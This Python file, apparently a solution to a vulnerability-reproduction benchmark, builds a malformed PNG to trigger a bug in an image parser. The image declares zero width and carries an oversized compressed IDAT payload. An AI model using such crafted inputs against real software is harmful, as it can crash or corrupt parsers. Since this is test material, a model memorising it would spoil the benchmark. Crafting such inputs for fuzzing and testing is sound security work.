import struct
import binascii
import zlib


class Solution:
    def _create_png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc = binascii.crc32(chunk_type + data) & 0xFFFFFFFF
        crc_bytes = struct.pack(">I", crc)
        return length + chunk_type + data + crc_bytes

    def _generate_zero_dim_png(self) -> bytes:
        # PNG signature
        signature = b"\x89PNG\r\n\x1a\n"

        # IHDR with width = 0, height = 1 (zero width triggers the bug)
        width = 0
        height = 1
        bit_depth = 8
        color_type = 2  # Truecolor RGB
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace,
        )
        ihdr_chunk = self._create_png_chunk(b"IHDR", ihdr_data)

        # IDAT: large decompressed size, small compressed size
        # This creates a huge mismatch between expected and actual data size
        raw_image_data = b"\x00" * 100000  # 100k bytes of zero
        compressed_data = zlib.compress(raw_image_data, level=9)
        idat_chunk = self._create_png_chunk(b"IDAT", compressed_data)

        # IEND chunk
        iend_chunk = self._create_png_chunk(b"IEND", b"")

        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def solve(self, src_path: str) -> bytes:
        return self._generate_zero_dim_png()